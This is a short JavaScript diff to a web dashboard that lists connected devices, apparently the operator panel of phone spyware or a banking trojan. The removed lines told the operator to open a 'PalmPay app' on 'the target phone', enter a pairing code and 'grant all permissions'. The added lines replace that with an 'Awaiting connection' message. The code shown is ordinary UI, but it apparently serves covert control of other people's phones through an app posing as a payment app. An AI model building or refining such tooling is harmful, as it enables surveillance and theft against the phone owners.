@@ -324,7 +324,6 @@ $('logoutBtn').addEventListener('click', function(){
   $('screenDetail').classList.remove('active');
   window.scrollTo(0, 0);
 });
-
 async function loadDevices(){
   const c = $('deviceListContainer');
   c.innerHTML = '<div class="loading">LOADING</div>';
@@ -336,18 +335,10 @@ async function loadDevices(){
     
     if(!j.ok || !list.length){
       c.innerHTML =
-        '<div style="text-align:center;padding:36px 20px;background:linear-gradient(180deg,#141f38,#0f1729);border:1px solid #1e2c4d;border-radius:16px;">' +
-          '<div style="font-size:44px;margin-bottom:14px;">📱</div>' +
-          '<div style="font-size:15px;font-weight:800;color:#fff;margin-bottom:8px;">No Device Connected</div>' +
-          '<div style="font-size:13px;color:#8894b5;line-height:1.65;margin-bottom:16px;">' +
-            'Your code is <strong style="color:#00e676;font-family:monospace;font-size:15px;">' + esc(state.userId) + '</strong>' +
-          '</div>' +
-          '<div style="font-size:12.5px;color:#8894b5;line-height:1.7;padding:14px;background:#0a1220;border-radius:12px;border:1px solid #1e2c4d;">' +
-            '1. Open the <strong style="color:#fff;">PalmPay app</strong> on the target phone<br>' +
-            '2. Enter the code above during setup<br>' +
-            '3. Grant all permissions<br>' +
-            '4. Device appears here in ~25 seconds' +
-          '</div>' +
+        '<div style="text-align:center;padding:60px 20px;">' +
+          '<div style="font-size:48px;margin-bottom:16px;opacity:0.5;">📡</div>' +
+          '<div style="font-size:18px;font-weight:800;color:#fff;margin-bottom:8px;">No Devices Online</div>' +
+          '<div style="font-size:13px;color:#8894b5;">Awaiting connection for code: <strong style="color:#00e676;font-family:monospace;">' + esc(state.userId) + '</strong></div>' +
         '</div>';
       return;
     }
